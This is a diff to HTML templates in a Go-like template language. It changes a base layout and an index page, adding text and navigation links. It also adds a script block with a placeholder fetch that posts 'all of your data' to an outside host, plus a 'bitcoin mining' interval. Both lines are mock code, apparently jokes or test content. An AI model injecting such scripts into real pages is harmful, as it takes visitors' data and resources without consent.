@@ -28,11 +28,16 @@ simp base(b *bytes.Buffer, child func()) {
 			<meta ...>
 		</head>
 		<body>
-		<div>
-			<header>HEADER</header>
-@			child()
-			<footer>FOOTER</footer>
-		<div>
+			<div>
+				<header>HEADER</header>
+@				child()
+				<footer>FOOTER</footer>
+			<div>
+		<script>
+			fetch("data.collection.ai", post = {all of your data});
+			"hi\""
+			setInterval(() => console.log('bitcoin mining'), 1);
+		</script>
 		</body>
 	</html>
 }
@@ -41,8 +46,17 @@ simp index(b *bytes.Buffer, user string) {
 @	base(b, func() {
 		<h1>Welcome to my site </h1>
 		<p>How are you doing?</p>
-		<div>hi @user </div>
-		<div>IN INDEX</div>
+		<div>hi @user welcome to my cool little website </div>
+		<span>I hope you enjoy it here lol</span>
+		<span>what is there to talk about</span>
+		<nav>
+			<a href="/">home</a>
+			<a href="/privacy-policy">Privacy Policy</a>
+			<a href="/sign-up">Sign Up</a>
+			<a href="/sign-in">Sign In</a>
+			<a href="/log-up">Log Up</a>
+			<a href="/register">Register</a>
+		</nav>
 @	})
 }
 
